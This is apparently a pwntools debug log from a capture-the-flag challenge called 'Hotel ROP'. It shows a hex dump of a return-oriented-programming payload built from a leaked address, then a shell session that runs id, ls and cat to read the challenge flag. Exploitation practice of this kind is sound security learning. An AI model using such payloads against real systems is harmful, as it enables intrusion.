```
[DEBUG] Received 0x49 bytes:
    b'Welcome to Hotel ROP, on main street 0x56105bd7036d\n'
    b'You come here often?\n'
[DEBUG] Sent 0x69 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000020  61 61 61 61  61 61 61 61  dc 01 d7 5b  10 56 00 00  │aaaa│aaaa│···[│·V··│
    00000030  83 02 d7 5b  10 56 00 00  0b 04 d7 5b  10 56 00 00  │···[│·V··│···[│·V··│
    00000040  de c0 37 13  00 00 00 00  09 04 d7 5b  10 56 00 00  │··7·│····│···[│·V··│
    00000050  00 00 76 cb  00 00 00 00  00 00 00 00  00 00 00 00  │··v·│····│····│····│
    00000060  85 01 d7 5b  10 56 00 00  0a                        │···[│·V··│·│
    00000069
[*] Switching to interactive mode
[DEBUG] Received 0xec bytes:
    b'I think you should come here more often.\n'
    b'Welcome to Hotel California\n'
    b'You can sign out anytime you want, but you can never leave\n'
    b'You want to work for Google?\n'
    b'Dis is da wae to be one of our finest guests!\n'
    b'Now you can replace our manager!\n'
I think you should come here more often.
Welcome to Hotel California
You can sign out anytime you want, but you can never leave
You want to work for Google?
Dis is da wae to be one of our finest guests!
Now you can replace our manager!
$ id
[DEBUG] Sent 0x3 bytes:
    b'id\n'
[DEBUG] Received 0x33 bytes:
    b'uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)\n'
uid=1000(pilot) gid=1000(pilot) groups=1000(pilot)
$ ls -al
[DEBUG] Sent 0x7 bytes:
    b'ls -al\n'
[DEBUG] Received 0x146 bytes:
    b'total 44\n'
    b'drwxr-xr-x 1 root  root   4096 May 14 01:31 .\n'
    b'drwxr-xr-x 1 root  root   4096 May 14 01:32 ..\n'
    b'-rw-r--r-- 1 root  root      2 May 14 01:30 .gdb_history\n'
    b'-rw-r--r-- 1 root  root     21 May 14 01:30 flag.txt\n'
    b'-rwxr-xr-x 1 pilot pilot 17096 May 14 01:30 hotel_rop\n'
    b'-rw-r--r-- 1 root  root    207 May 14 01:30 startService.sh\n'
total 44
drwxr-xr-x 1 root  root   4096 May 14 01:31 .
drwxr-xr-x 1 root  root   4096 May 14 01:32 ..
-rw-r--r-- 1 root  root      2 May 14 01:30 .gdb_history
-rw-r--r-- 1 root  root     21 May 14 01:30 flag.txt
-rwxr-xr-x 1 pilot pilot 17096 May 14 01:30 hotel_rop
-rw-r--r-- 1 root  root    207 May 14 01:30 startService.sh
$ cat ./flag.txt
[DEBUG] Sent 0xf bytes:
    b'cat ./flag.txt\n'
[DEBUG] Received 0x15 bytes:
    b'dctf{ch41n_0f_h0t3ls}'
dctf{ch41n_0f_h0t3ls}$

```
